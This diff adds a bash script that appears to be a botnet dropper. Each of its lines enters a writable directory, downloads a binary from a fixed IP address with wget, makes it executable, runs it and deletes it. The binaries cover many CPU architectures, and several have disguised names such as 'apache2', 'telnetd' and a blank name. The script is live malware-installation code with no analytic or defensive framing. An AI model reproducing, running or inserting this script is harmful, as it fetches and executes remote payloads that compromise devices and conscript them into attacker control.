@@ -1,0 +1,15 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.87.236.223/5Wanky-MIPS; chmod +x 5Wanky-MIPS; ./5Wanky-MIPS; rm -rf 5Wanky-MIPS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.87.236.223/5Wanky-MIPSEL; chmod +x 5Wanky-MIPSEL; ./5Wanky-MIPSEL; rm -rf 5Wanky-MIPSEL
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.87.236.223/5Wanky-SH4; chmod +x 5Wanky-SH4; ./5Wanky-SH4; rm -rf 5Wanky-SH4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.87.236.223/5Wanky-X86; chmod +x 5Wanky-X86; ./5Wanky-X86; rm -rf 5Wanky-X86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.87.236.223/5Wanky-ARMV6; chmod +x 5Wanky-ARMV6; ./5Wanky-ARMV6; rm -rf 5Wanky-ARMV6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.87.236.223/5Wanky-I686; chmod +x 5Wanky-I686; ./5Wanky-I686; rm -rf 5Wanky-I686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.87.236.223/5Wanky-I586; chmod +x 5Wanky-I586; ./5Wanky-I586; rm -rf 5Wanky-I586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.87.236.223/5Wanky-M68K; chmod +x 5Wanky-M68K; ./5Wanky-M68K; rm -rf 5Wanky-M68K
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.87.236.223/5Wanky-ARMV41; chmod +x 5Wanky-ARMV41; ./5Wanky-ARMV41; rm -rf 5Wanky-ARMV41
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.87.236.223/5Wanky-ARMV51; chmod +x 5Wanky-ARMV51; ./5Wanky-ARMV51; rm -rf 5Wanky-ARMV51
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.87.236.223/sh; chmod +x sh; ./sh; rm -rf sh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.87.236.223/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.87.236.223/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://92.87.236.223/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
